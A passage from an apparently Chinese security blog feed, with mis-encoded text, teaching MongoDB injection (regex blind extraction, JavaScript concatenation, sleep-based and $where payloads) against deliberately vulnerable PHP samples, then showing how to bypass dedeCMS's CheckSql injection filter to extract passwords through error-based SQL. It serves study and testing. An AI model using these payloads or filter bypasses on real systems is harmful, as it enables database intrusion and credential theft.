class="variable">$lock</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$coll</span>-&gt;<span class="title function_ invoke__">find</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span>-&gt;<span class="title function_ invoke__">count</span>()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;the lock is right,but wrong key&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;lock is wrong&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$lock</span> == <span class="string">&#x27;aabbccdd&#x27;</span>&amp;&amp;<span class="variable">$key</span>==<span class="string">&#x27;aabbccdd&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your flag is xxxxxxx&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;lock is wrong&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åè¿™é‡Œåªç»™å‡ºäº†å¯¹æˆ–é”™çš„å›æ˜¾,boolä¸€å‘ æˆ‘ä»¬è¿™é‡Œå°±ç®€è¦çœ‹ä¸‹ä»–ä»¬çš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key=1&amp;lock[$regex]=^9</span><br><span class="line">key=1&amp;lock[$regex]=^9c</span><br><span class="line">key=1&amp;lock[$regex]=^9cc</span><br><span class="line">key=1&amp;lock[$regex]=^9cc3</span><br><span class="line">key=1&amp;lock[$regex]=^9cc32</span><br><span class="line">key=1&amp;lock[$regex]=^9cc32b</span><br><span class="line">key=1&amp;lock[$regex]=^9cc32bd</span><br><span class="line">key=1&amp;lock[$regex]=^9cc32bd6</span><br></pre></td></tr></table></figure><p>æ­£åˆ™åŒ¹é…çœ‹lockçš„å€¼æ˜¯å¦ä¸ºåé¢çš„å€¼å³å¯,é€ä½çˆ†å³å¯</p><h4 id="å­—ç¬¦ä¸²æ‹¼æ¥">å­—ç¬¦ä¸²æ‹¼æ¥</h4><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;var data = db.test.findOne(&#123;username:&#x27;<span class="subst">$username</span>&#x27;,password:&#x27;<span class="subst">$password</span>&#x27;&#125;);return data;&quot;</span>;</span><br><span class="line"><span class="comment">//$query = &quot;return db.test.findOne();&quot;;</span></span><br><span class="line"><span class="comment">//echo $query;</span></span><br><span class="line"><span class="variable">$mongo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mongoclient</span>();</span><br><span class="line"><span class="variable">$db</span> = <span class="variable">$mongo</span>-&gt;myinfo;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;ok&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;retval&#x27;</span>]!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;username:&#x27;</span>.<span class="variable">$data</span>[<span class="string">&#x27;retval&#x27;</span>][<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;password:&#x27;</span>.<span class="variable">$data</span>[<span class="string">&#x27;retval&#x27;</span>][<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;æœªæ‰¾åˆ°&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$data</span>[<span class="string">&#x27;errmsg&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°å…³é”®éƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;var data = db.test.findOne(&#123;username:&#x27;$username&#x27;,password:&#x27;$password&#x27;&#125;);return data;&quot;;</span><br></pre></td></tr></table></figure><p>è¿˜è®°å¾—å‰é¢æåˆ°çš„å—?mangodbçš„å­—ç¬¦ä¸²æ‹¼æ¥è¯­æ³•ä¸ºjs,é‚£ä¹ˆæˆ‘ä»¬åªè¦ç”¨jsè¯­æ³•è¿›è¡Œæ„é€ å³å¯,åŸç†å’Œæ™®é€šçš„mysqlçš„æ³¨å…¥ä¸€æ ·,åªä¸è¿‡è¯­è¨€å‘ç”Ÿäº†å°æ”¹å˜è€Œå·² æ¯”å¦‚æˆ‘ä»¬å¯ä»¥å†™payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:1,password:2&#125;//&amp;password=test</span><br></pre></td></tr></table></figure><p>è¿”å›çš„æ˜¯usernameä¸º1,passwordä¸º2 ç„¶åæä¸€ç‚¹,å°±æ˜¯executeæ–¹æ³•å¯ä»¥å¤šè¯­å¥æ‰§è¡Œ,ä¸æ¼”ç¤º,è¿™é‡Œå°±åˆ—å‡ºå‡ ä¸ªpayloadå§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:tojson(db.getCollectionNames()),password:2&#125;;//&amp;password=test</span><br><span class="line">//çˆ†mangodbç‰ˆæœ¬</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:tojson(db.test.find()[0]),password:2&#125;;//&amp;password=test</span><br><span class="line">//çˆ†testé›†åˆç¬¬ä¸€æ¡æ•°æ®</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);return &#123;username:tojson(db.test.find()[1]),password:2&#125;;//&amp;password=test</span><br><span class="line">//çˆ†testé›†åˆç¬¬äºŒæ¡æ•°æ®</span><br></pre></td></tr></table></figure><h4 id="sleep">sleep</h4><p>é«˜ç‰ˆæœ¬é‡Œå¢åŠ äº†sleepå‡½æ•°,é‚£ä¹ˆå°±å¯ä»¥åœ¨æ— å›æ˜¾çš„æ—¶å€™è¿›è¡Œæ—¶é—´ç›²æ³¨äº†,ä¸è¿‡ä¼¼ä¹é«˜ç‰ˆæœ¬é‡Œä¸èƒ½ç”¨æ³¨é‡Šè¯­å¥,é‚£ä¹ˆé—­åˆå°±å¥½äº† payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?username=test&#x27;&#125;);if (db.version() &gt; &quot;0&quot;) &#123; sleep(10000); exit; &#125;var b=(&#123;a:&#x27;1&amp;password=test</span><br><span class="line">//å»¶æ—¶10s</span><br></pre></td></tr></table></figure><h4 id="where">where</h4><p>mangodbçš„whereå°±å’Œsqlè¯­å¥çš„whereå·®ä¸å¤š,whereçš„ç”¨æ³•å‰é¢å·²ç»æåˆ°,æ˜¯é€šè¿‡å¼•å…¥ä¸€ä¸ªjså‡½æ•°æ¥ä½œä¸ºé™åˆ¶,å½“å‡½æ•°ä¸­å­˜åœ¨æœªè¿‡æ»¤çš„ç”¨æˆ·è¾“å…¥çš„æ—¶å€™,æ³¨å…¥å°±äº§ç”Ÿäº† å®ä¾‹ä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$mongo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mongoclient</span>();</span><br><span class="line"><span class="variable">$db</span> = <span class="variable">$mongo</span>-&gt;myinfo; <span class="comment">//é€‰æ‹©æ•°æ®åº“</span></span><br><span class="line"><span class="variable">$coll</span> = <span class="variable">$db</span>-&gt;news; <span class="comment">//é€‰æ‹©é›†åˆ</span></span><br><span class="line"><span class="variable">$news</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;news&#x27;</span>];</span><br><span class="line"><span class="variable">$function</span> = <span class="string">&quot;function() &#123;if(this.news == &#x27;<span class="subst">$news</span>&#x27;) return true&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$function</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$coll</span>-&gt;<span class="title function_ invoke__">find</span>(<span class="keyword">array</span>(<span class="string">&#x27;$where&#x27;</span>=&gt;<span class="variable">$function</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">count</span>()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;è¯¥æ–°é—»å­˜åœ¨&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;è¯¥æ–°é—»ä¸å­˜åœ¨&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›¸å½“äºsqlè¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> news<span class="operator">=</span><span class="string">&#x27;$news&#x27;</span></span><br></pre></td></tr></table></figure><p>æ£€æµ‹æ³¨å…¥çš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/3.php?news=test&#x27;</span><br><span class="line">//é”™è¯¯</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/3.php?news=test&#x27;&amp;&amp;&#x27;1&#x27;==&#x27;1</span><br><span class="line">//æ­£ç¡®</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/3.php?news=test&#x27;&amp;&amp;&#x27;1&#x27;==&#x27;2</span><br><span class="line">//é”™è¯¯</span><br></pre></td></tr></table></figure><p>æå–ä¿¡æ¯çš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/3.php?news=test&#x27;&amp;&amp;db.getCollectionNames().length&gt;0&amp;&amp;&#x27;1&#x27;==&#x27;1</span><br><span class="line">//æŸ¥çœ‹é›†åˆæ•°é‡</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/3.php?news=test&#x27;&amp;&amp;db.getCollectionNames()[0].length==6&amp;&amp;&#x27;1&#x27;==&#x27;1</span><br><span class="line">//æŸ¥çœ‹é›†åˆåç§°é•¿åº¦</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/3.php?news=test&#x27;&amp;&amp;db.getCollectionNames()[0][0]==&#x27;m&#x27;&amp;&amp;&#x27;1&#x27;==&#x27;1</span><br><span class="line">//çˆ†æ•°æ®</span><br></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç«  <a href="https://www.secpulse.com/archives/3278.html" title="https://www.secpulse.com/archives/3278.html">https://www.secpulse.com/archives/3278.html</a></p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Bypass Checksql</title>
      <link href="/2018/05/28/bypass-checksql/"/>
      <url>/2018/05/28/bypass-checksql/</url>
      
        <content type="html"><![CDATA[<p>dedeCMSçš„CheckSql()å‡½æ•°,80secå¼€å‘çš„é€šç”¨é˜²æ³¨å…¥idsç¨‹åº..æ˜¯ä¸ªæ¯”è¾ƒè€çš„ä¸œè¥¿äº†..ä½†æ˜¯æœ€è¿‘æŒ–æ´çš„æ—¶å€™ç¢°åˆ°äº†..ç»•äº†ä¸€ä¸‹,ç›´æ¥å…³é”®è¯ä¸¢googleå°±æ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« ,è¿˜æåˆ°äº†å‡½æ•°çš„æºç ,å¤§æ¦‚åœ°çœ‹äº†ä¸€ä¸‹,è¿™é‡Œå°±è®°å½•ä¸€ä¸‹å§ å…ˆçœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckSql</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$querytype</span>=<span class="string">&#x27;select&#x27;</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$clean</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$error</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pos</span> = -<span class="number">1</span>;</span><br><span class="line">    <span class="variable">$old_pos</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$querytype</span> == <span class="string">&#x27;select&#x27;</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^0-9a-z@\._-]&#123;1,&#125;(unionsleepbenchmarkload_fileoutfile)[^0-9a-z@\.-]&#123;1,&#125;/&#x27;</span>, <span class="variable">$sql</span>)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$sqlSelectBreak</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$sql</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$pos</span> === <span class="literal">false</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$clean</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$sql</span>, <span class="variable">$old_pos</span>, <span class="variable">$pos</span> - <span class="variable">$old_pos</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$pos1</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$sql</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">            <span class="variable">$pos2</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$sql</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="variable">$pos</span> + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$pos1</span> === <span class="literal">false</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$pos2</span> == <span class="literal">false</span>  <span class="variable">$pos2</span> &gt; <span class="variable">$pos1</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$pos</span> = <span class="variable">$pos1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$pos</span> = <span class="variable">$pos2</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$clean</span> .= <span class="string">&#x27;$s$&#x27;</span>;</span><br><span class="line">        <span class="variable">$old_pos</span> = <span class="variable">$pos</span> + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$clean</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$sql</span>, <span class="variable">$old_pos</span>);</span><br><span class="line">    <span class="variable">$clean</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;~\s+~s&#x27;</span> ), <span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>), <span class="variable">$clean</span>)));</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$clean</span>, <span class="string">&#x27;union&#x27;</span>) !== <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;~(^[^a-z])union($[^[a-z])~s&#x27;</span>, <span class="variable">$clean</span>) != <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;union detect&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$clean</span>, <span class="string">&#x27;/*&#x27;</span>) &gt; <span class="number">2</span>  <span class="title function_ invoke__">strpos</span>(<span class="variable">$clean</span>, <span class="string">&#x27;--&#x27;</span>) !== <span class="literal">false</span>  <span class="title function_ invoke__">strpos</span>(<span class="variable">$clean</span>, <span class="string">&#x27;#&#x27;</span>) !== <span class="literal">false</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;comment detect&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$clean</span>, <span class="string">&#x27;sleep&#x27;</span>) !== <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;~(^[^a-z])sleep($[^[a-z])~s&#x27;</span>, <span class="variable">$clean</span>) != <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;slown down detect&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$clean</span>, <span class="string">&#x27;benchmark&#x27;</span>) !== <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;~(^[^a-z])benchmark($[^[a-z])~s&#x27;</span>, <span class="variable">$clean</span>) != <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;slown down detect&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$clean</span>, <span class="string">&#x27;load_file&#x27;</span>) !== <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;~(^[^a-z])load_file($[^[a-z])~s&#x27;</span>, <span class="variable">$clean</span>) != <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;file fun detect&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$clean</span>, <span class="string">&#x27;into outfile&#x27;</span>) !== <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;~(^[^a-z])into\s+outfile($[^[a-z])~s&#x27;</span>, <span class="variable">$clean</span>) != <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;file fun detect&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;~\([^)]*?select~s&#x27;</span>, <span class="variable">$clean</span>) != <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&#x27;sub select detect&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$fail</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;<span class="subst">$sql</span>,<span class="subst">$error</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬çœ‹ä¸€ä¸‹payload,æœ¬åœ°æµ‹è¯•ä¸€ä¸‹,ç”¨çš„sqlè¯­å¥ä¸º</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `dy_zgz` <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">78</span> <span class="keyword">and</span> (<span class="keyword">sElecT</span>(now()))</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠ<span class="math inline">\(cleanç»™echoå‡ºæ¥,å¾—åˆ°ç»“æœ: ![blacsheep](/images/2018/06/1.jpg) å¯ä»¥çœ‹åˆ°ç¬¬äºŒä¸ªè¯­å¥çš„å­æŸ¥è¯¢è¢«detectäº†,é‚£ä¹ˆæ€ä¹ˆbypasså‘¢? å‘ç°å‰é¢çš„whileæŠŠå‡½æ•°ä¸­åœ¨å•å¼•å·é—´çš„ä¸œè¥¿æ¢æˆ\)</span>s$ç„¶åå†æŠŠsqlè¯­å¥æ‹¿å»æ£€æµ‹,é‚£ä¹ˆæˆ‘ä»¬æµ‹è¯•ç”¨å•å¼•å·åŒ…å«æˆ‘ä»¬çš„sqlè¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `dy_zgz` <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">78</span> <span class="keyword">and</span> <span class="string">&#x27;(sElecT(now()))&#x27;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœ <img src="/images/2018/06/2.jpg" alt="blacsheep" /> è¿™æ¬¡å°±æ²¡æœ‰è¢«detectåˆ°,å³ä½¿æŸ¥è¯¢æ˜¯ç›¸åŒçš„,å› ä¸ºä¸¢è¿›å»æŸ¥è¯¢çš„æ˜¯$clean,ä¹Ÿå³ç¬¬ä¸€ä¸ªsqlè¯­å¥,é‡Œé¢å¹¶æ²¡æœ‰selectç›¸å…³å¥,æ‰€ä»¥æˆåŠŸbypass é‚£ä¹ˆå¦‚ä½•åˆ©ç”¨å‘¢,è¿™é‡Œç”¨åˆ°inå’Œåå¼•å·æ¥ç»•è¿‡,mysqlä¸­@å¯ä»¥å®šä¹‰ä¸€ä¸ªå˜é‡,åå¼•å·æ¥è½¬ä¹‰å•å¼•å·,é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºä¸‹é¢çš„å¥å­</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> is_admin<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> is_admin <span class="keyword">in</span> (<span class="type">char</span>(@`<span class="string">&#x27;`), extractvalue(1, concat_ws(0x20, 0x5c,(select password from users limit 1))),char(@`&#x27;</span>`))</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆçœ‹char(@<code>'</code>),é»˜è®¤å®šä¹‰å˜é‡æ˜¯ä¸ºç©ºçš„,æ‰€ä»¥æå–ç»“æœå¦‚ä¸‹ <img src="/images/2018/06/3.jpg" alt="blacsheep" /> é‚£ä¹ˆè¿™æ ·æŠ¥é”™æ³¨å…¥çš„åœ°æ–¹å°±ä¼šæ‰§è¡Œ,äºæ˜¯å°±ä¼šè¿”å›æŠ¥é”™ä¿¡æ¯,æ¯”å¦‚ <img src="/images/2018/06/4.jpg" alt="blacsheep" /> æ˜ç™½äº†åŸç†,ç»•è¿‡ä¹Ÿå°±ä¸éš¾äº†. ç»™å‡ºä¸¤ç¯‡å‚è€ƒé“¾æ¥ <a href="http://goodwaf.com/2016/11/30/DedeCMS-CheckSql%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/" title="http://goodwaf.com/2016/11/30/DedeCMS-CheckSql%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/">http://goodwaf.com/2016/11/30/DedeCMS-CheckSql%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/</a> <a 